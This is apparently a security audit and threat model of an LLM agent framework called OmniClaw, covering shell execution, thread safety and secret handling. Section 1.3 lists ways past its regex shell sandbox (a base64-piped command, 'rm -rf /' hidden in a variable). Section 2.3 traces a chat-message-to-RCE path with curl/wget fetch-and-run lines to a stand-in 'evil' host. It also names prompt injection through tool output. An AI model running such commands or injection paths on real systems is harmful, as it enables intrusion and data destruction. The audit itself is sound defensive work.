# OmniClaw — Complete Architecture Audit & Threat Model

## EXECUTIVE SUMMARY

**Production Readiness Score:** 2/10

This is not a production system. It is a prototype with severe architectural, security, and reliability flaws across every dimension. The codebase exhibits classic "AI-generated code entropy" — sprawling feature accretion without architectural coherence, defensive boundaries, or operational considerations.

---

## 1. ARCHITECTURAL FINDINGS

### 1.1 Runtime Architecture

| Component | Status | Risk |
| ----------- | -------- | ------ |
| **Process Model** | Monolithic single-process | CRITICAL |
| **Service Boundaries** | None — everything in one process | CRITICAL |
| **IPC** | None (except placeholder P2P mesh) | CRITICAL |
| **Async Model** | Mixed asyncio + ThreadPool + threading.Thread | HIGH |
| **State Management** | Global mutable singletons everywhere | CRITICAL |
| **Lifecycle** | No startup ordering, no health checks, no graceful degradation | CRITICAL |
| **Configuration** | Plaintext YAML with API keys | CRITICAL |

### 1.2 God Files

| File | Lines | Problem |
| ------ | ------- | --------- |
| `omniclaw.py` | 995 | Main entry point, inits everything, mixed concerns |
| `core/worker.py` | 578 | Worker agent, tool implementations, LLM calls, imports 15+ modules |
| `core/messaging_gateway.py` | 678 | 6 bot implementations, command routing, message handling |
| `core/orchestrator.py` | 422 | Manager-Worker orchestration, task lifecycle, dependency resolution |
| `core/security/__init__.py` | 77 | SecurityLayer combining 6 sub-modules but no real enforcement |

### 1.3 Critical Pathologies

#### A. Shell Execution (CRITICAL)

```python
# worker.py:417-437 — LLM can directly execute ANY shell command
async def _shell_execute(self, command: str, timeout: int = 30) -> Dict:
    import subprocess
    result = subprocess.run(command, shell=True, ...)  # shell=True + LLM input = RCE
```

The `ShellSandbox` regex-based blocking (285 patterns in `shell_sandbox.py`) is trivially bypassable:

- Base64 encoding: `echo bmMgLWxlIDEyNy4wLjAuMQo= | base64 -d | sh`
- Variable expansion: `c='rm -rf /'; $c`
- Unicode homoglyphs in command names

#### B. Thread Safety (CRITICAL)

```python
# core/memory.py — Shared mutable state with zero synchronization
self.conversations: Dict[str, List[Dict]] = {}
self.tasks: Dict[str, Dict] = {}
self.knowledge: Dict[str, Dict] = {}
self.embeddings: Dict[str, np.ndarray] = {}
# _save_memory() called from async code — no locks
```

- `_save_memory()` opens/writes JSON files with no atomicity
- Concurrent `store()` calls cause torn writes
- `OutputStreamAdapter.write()` (sync) creates `asyncio.create_task()` from arbitrary threads

#### C. Fire-and-Forget Tasks (HIGH)

```python
# messaging_gateway.py:545 — No exception handling, no reference tracking
asyncio.create_task(self._execute_command(command))
asyncio.create_task(self._handle_natural_language(message))
```

These tasks are uncancellable, unmonitored, and leak on shutdown.

#### D. Missing Resource Limits (HIGH)

```python
# orchestrator.py — ThreadPool with 20 workers, no limits
self.executor = ThreadPoolExecutor(max_workers=20)

# No semaphore on concurrent LLM calls
# No backpressure on task_queue
# No timeout on subtask execution
```

#### E. Config Security Theater (HIGH)

```yaml
# config.example.yaml — API keys in plaintext
apis:
  - provider: openai
    key: "sk-your-openai-key-here"
  
security:
  encrypt_api_keys: true  # NOT IMPLEMENTED — encrypt_api_keys is never read
```

#### F. eBPF Without Isolation (HIGH)

```python
# ebpf_monitor.py — BCC runs inline in Python process
from bcc import BPF
self.bpf = BPF(text=bpf_text)  # Requires root, runs in-process
# Falls back to random mock data when BCC unavailable
```

---

## 2. THREAT MODEL

### 2.1 Attack Surface Map

```text
                     ┌─────────────────────────────┐
                     │      Telegram/Discord/       │
                     │      WhatsApp/Slack          │
                     └──────────┬──────────────────┘
                                │ message
                     ┌──────────▼──────────────────┐
                     │    MessagingGateway          │
                     │  - fire-and-forget tasks     │
                     │  - no input validation       │
                     └──────────┬──────────────────┘
                                │ command/message
                     ┌──────────▼──────────────────┐
                     │    HybridHiveOrchestrator    │
                     │  - LLM prompt injection      │
                     │  - agent hallucination       │
                     └──────────┬──────────────────┘
                                │ subtask
                     ┌──────────▼──────────────────┐
                     │      WorkerAgent             │
                     │  - _shell_execute(shell=True) │
                     │  - _file_operation(any path)  │
                     │  - LLM output = code exec     │
                     └─────────────────────────────┘
```

### 2.2 Threat Vectors

| # | Threat | Vector | Severity | Likelihood |
| --- | -------- | -------- | ---------- | ------------ |
| T1 | **Remote Code Execution** | LLM generates `subprocess.run(cmd, shell=True)` with arbitrary input | CRITICAL | HIGH |
| T2 | **Prompt Injection** | Web content / files in tool output contain instruction override | CRITICAL | HIGH |
| T3 | **Data Exfiltration** | LLM reads `.env`, `id_rsa`, config.yaml via tool output | HIGH | MEDIUM |
| T4 | **Credential Theft** | API keys stored in plaintext YAML file | CRITICAL | HIGH |
| T5 | **Denial of Service** | Unbounded ThreadPool, no backpressure, memory exhaustion | HIGH | MEDIUM |
| T6 | **Privilege Escalation** | eBPF runs in-process with root privileges | HIGH | LOW |
| T7 | **Race Condition** | Unsynchronized shared dicts, JSON file corruption | MEDIUM | HIGH |
| T8 | **Zombie Processes** | `subprocess.run` with no lifecycle management | MEDIUM | MEDIUM |
| T9 | **Resource Exhaustion** | `alerts` list unbounded growth, no eviction policy | MEDIUM | HIGH |
| T10 | **LLM Hallucination** | Agent fabricates tool results, cascading failures | HIGH | HIGH |
| T11 | **Supply Chain** | `requirements.txt` pins 90+ packages, no hash verification | MEDIUM | LOW |
| T12 | **Injection via MCP** | `omniclaw_mcp.py` spawns subprocess directly | CRITICAL | MEDIUM |

### 2.3 Attack Path: LLM to RCE

```text
Attacker sends message to Telegram bot
  → MessagingGateway._handle_natural_language()
    → Orchestrator.execute_goal("run curl http://evil/backdoor.sh | bash")
      → ManagerAgent.decompose_goal() 
        → LLM decides executor role needed
          → WorkerAgent._execute_specialized()
            → WorkerAgent._shell_execute("curl http://evil/backdoor.sh | bash", shell=True)
              → subprocess.run(..., shell=True) → RCE ✅
```

The ShellSandbox regex for `curl.*\|.*sh` is trivially bypassed:

- `curl http://evil/payload -o /tmp/x && bash /tmp/x`
- `curl http://evil/payload | base64 -d | bash`
- `wget http://evil/script.sh; sh script.sh`

---

## 3. SECURITY RISK MATRIX

| Category | Score | Assessment |
| ---------- | ------- | ------------ |
| **Authentication** | 1/10 | Plaintext keys in YAML, no auth service |
| **Authorization** | 0/10 | No RBAC, no capability system, no policy engine |
| **Input Validation** | 2/10 | Regex-based shell blocking only |
| **Output Encoding** | 1/10 | No output sanitization for LLM tool results |
| **Cryptography** | 3/10 | YubiKey vault exists but optional, no key rotation |
| **Session Management** | 2/10 | Budget tracker exists, no auth tokens |
| **Audit Logging** | 1/10 | Basic Python logging, no structured audit trail |
| **Network Security** | 1/10 | No TLS, no mTLS, plaintext WebSocket |
| **Process Isolation** | 0/10 | No containers, no sandboxes, no cgroups |
| **Error Handling** | 2/10 | Bare except clauses, catch-all error suppression |
| **Configuration** | 1/10 | Plaintext secrets, no validation |
| **Dependencies** | 2/10 | No lockfile hashes, 104 packages in requirements.txt |
| **Runtime Safety** | 1/10 | Zombie processes, thread safety violations |
| **Observability** | 1/10 | No metrics, no tracing, no structured logging |
| **Disaster Recovery** | 0/10 | No backups, no state persistence strategy |

**Overall Security Score:** 1.2/10

---

## 4. DEPENDENCY MAP (CURRENT)

```text
omniclaw.py
├── core/orchestrator.py (HybridHiveOrchestrator)
│   ├── core/arbitrator.py (litellm routing)
│   │   └── core/hardware_monitor.py (psutil)
│   ├── core/llm_council.py
│   ├── core/manager.py (ManagerAgent)
│   │   └── core/arbitrator.py
│   └── core/worker.py (WorkerAgent)
│       ├── core/temporal_memory_v2.py
│       ├── core/advanced_features/recommendation_engine.py
│       ├── modules/swarm_oracle/ (ChromaDB, Ollama)
│       ├── modules/pentagi/ (REST+GraphQL client)
│       ├── modules/offensive/model_decensor.py
│       ├── modules/recon/stealth_scraper.py
│       └── modules/observability/langwatch_tracer.py
├── core/memory.py (VectorMemory)
│   └── FAISS / numpy
├── core/api_pool.py (APIPool)
├── core/messaging_gateway.py
│   ├── TelegramBot (python-telegram-bot)
│   ├── WhatsAppBot (placeholder)
│   ├── DiscordBot (discord.py)
│   ├── SlackBot (placeholder)
│   ├── IMessageBot (placeholder)
│   └── MatrixBot (placeholder)
├── core/security/__init__.py (SecurityLayer)
│   ├── FileGuard
│   ├── ShellSandbox
│   ├── PromptGuard
│   ├── SessionBudget
│   ├── RiskEngine
│   └── IPSAgent
├── core/quantum_gateway.py (Qiskit)
├── core/health_server.py (aiohttp)
└── core/main.py (OmniClawDaemon)
    ├── modules/p2p/mesh.py
    ├── modules/security/honeypot.py
    ├── modules/vision/computer_use.py
    └── modules/evolution/genesis.py
```

---

## 5. PRODUCTION READINESS SCORE: 2/10

| Criterion | Score | Notes |
| ----------- | ------- | ----- |
| **Architecture** | 1/10 | Monolith, no service boundaries, no IPC |
| **Security** | 1/10 | RCE via LLM, plaintext secrets, no RBAC |
| **Observability** | 1/10 | Python print-level logging, no metrics/tracing |
| **Reliability** | 2/10 | No retries, no circuit breakers, no health checks |
| **Scalability** | 1/10 | Single process, no horizontal scaling, 0 queue durability |
| **Maintainability** | 3/10 | God files, mixed concerns, no DI |
| **Testability** | 2/10 | No meaningful tests, tightly coupled |
| **Deployability** | 3/10 | Dockerfile exists but no orchestrator support |
| **Data Safety** | 1/10 | JSON file persistence, no transactions |
| **Config Management** | 2/10 | Flat YAML, no validation, no schema |

---

## 6. RECOMMENDED ACTION PLAN

1. **IMMEDIATE**: Remove all `shell=True` subprocess calls — replace with structured typed tool schemas
2. **IMMEDIATE**: Move API keys to environment variables / vault — never in config files
3. **HIGH**: Implement service-oriented architecture with isolated runtime boundaries
4. **HIGH**: Add policy engine between planner and executor
5. **HIGH**: Implement event-driven message bus (Redis Streams / NATS)
6. **HIGH**: Add structured logging, metrics, and distributed tracing
7. **MEDIUM**: Replace SQLite/JSON with PostgreSQL for durable state
8. **MEDIUM**: Add container isolation (Docker with seccomp profiles)
9. **MEDIUM**: Implement proper async lifecycle management
10. **LOW**: Migrate eBPF to isolated Rust service
